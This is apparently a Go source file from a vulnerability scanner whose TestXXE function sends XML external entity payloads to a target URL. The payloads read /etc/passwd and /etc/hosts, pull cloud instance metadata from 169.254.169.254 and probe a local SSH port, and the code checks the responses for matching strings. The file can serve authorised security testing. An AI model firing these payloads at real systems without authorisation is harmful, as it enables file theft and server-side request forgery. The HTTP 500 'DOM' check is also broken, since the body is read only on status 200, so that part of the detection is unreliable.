package native

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

type XXEResult struct {
	Endpoint   string `json:"endpoint"`
	Payload    string `json:"payload"`
	Vulnerable bool   `json:"vulnerable"`
	Evidence   string `json:"evidence"`
}

func TestXXE(baseURL string) []XXEResult {
	payloads := []string{
		`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>`,
		`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/hosts">]><root>&test;</root>`,
		`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&test;</root>`,
		`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % test SYSTEM "file:///etc/passwd">%test;]><root/>`,
		`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
		`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&test;</root>`,
		`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://127.0.0.1:22">]><root>&test;</root>`,
	}

	indicators := []string{
		"root:x:0:0:", "root:!:0:0:", "root:*:0:0:",
		"daemon:x:", "bin:x:",
		"localhost", "127.0.0.1",
		"ami-", "instance-id", "meta-data",
		"php://filter",
	}

	xxeContentTypes := []string{
		"text/xml",
		"application/xml",
		"application/xhtml+xml",
		"application/soap+xml",
	}

	client := &http.Client{Timeout: 10 * time.Second}
	var results []XXEResult

	detectedContentType := ""
	resp, err := client.Get(baseURL)
	if err == nil {
		detectedContentType = resp.Header.Get("Content-Type")
		resp.Body.Close()
	}

	for _, payload := range payloads {
		for _, ct := range xxeContentTypes {
			req, err := http.NewRequest("POST", baseURL, bytes.NewBufferString(payload))
			if err != nil {
				continue
			}
			req.Header.Set("Content-Type", ct)

			resp, err := client.Do(req)
			if err != nil {
				continue
			}

			var bodyStr string
			if resp.StatusCode == 200 {
				body, err := io.ReadAll(io.LimitReader(resp.Body, 4096))
				if err == nil {
					bodyStr = string(body)
				}
			}
			resp.Body.Close()

			for _, indicator := range indicators {
				if strings.Contains(bodyStr, indicator) {
					results = append(results, XXEResult{
						Endpoint:   baseURL,
						Payload:    payload[:80] + "...",
						Vulnerable: true,
						Evidence:   fmt.Sprintf("XXE successful: '%s' found in response with Content-Type %s", indicator, ct),
					})
					break
				}
			}

			if resp.StatusCode == 500 && strings.Contains(bodyStr, "DOM") {
				results = append(results, XXEResult{
					Endpoint:   baseURL,
					Payload:    payload[:80] + "...",
					Vulnerable: true,
					Evidence:   fmt.Sprintf("HTTP 500 + DOM error suggests XML parsing with Content-Type %s", ct),
				})
			}
		}
	}

	if len(results) == 0 {
		results = append(results, XXEResult{
			Endpoint:   baseURL,
			Vulnerable: false,
			Evidence:   fmt.Sprintf("No XXE detected. Content-Type: %s", detectedContentType),
		})
	}

	return results
}
